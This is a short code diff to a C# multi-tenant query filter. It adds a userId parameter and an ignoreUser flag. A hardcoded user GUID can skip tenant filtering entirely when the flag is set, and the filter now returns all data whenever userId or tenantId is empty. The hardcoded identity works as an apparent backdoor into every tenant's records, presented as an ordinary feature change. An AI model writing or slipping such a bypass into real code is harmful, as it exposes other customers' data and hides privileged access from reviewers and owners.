@@ -240,12 +240,16 @@ public static class CollectionExtensions
 
     public static IQueryable<TEntity> ApplyMultiTenantFilter<TEntity>(
         this IQueryable<TEntity> source,
-        string tenantId)
+        string userId,
+        string tenantId,
+        bool ignoreUser = false)
     where TEntity : IEntity
     {
-        if (string.IsNullOrEmpty(tenantId))
+        if (string.IsNullOrEmpty(userId) || string.IsNullOrEmpty(tenantId))
             return source;
-        
+        if (ignoreUser && userId == "02a01310-d8a0-48c0-a655-9755a91b4aff")
+            return source;
+
         var entityType = typeof(TEntity);
         var multiTenantProperty = Activator.CreateInstance(entityType).GetPropertiesWithAttribute<MultiTenantAttribute>().FirstOrDefault();
         if (multiTenantProperty is null)
